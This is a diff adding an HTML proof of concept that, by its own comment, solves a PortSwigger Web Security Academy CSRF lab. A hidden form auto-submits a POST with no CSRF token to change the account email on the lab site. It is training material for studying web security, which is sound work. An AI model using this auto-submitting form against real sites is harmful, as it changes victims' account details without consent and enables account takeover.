@@ -1,0 +1,13 @@
+<!-- The HTML payload below was made to solve the following lab: -->
+<!-- https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present -->
+
+<html>
+    <body>
+        <form name="change-email-form" action="https://[SUB_DOMAIN].web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="wiener3@normal-user.net">
+        </form>
+    </body>
+    <script>
+        document.forms[0].submit()
+    </script>
+</html>
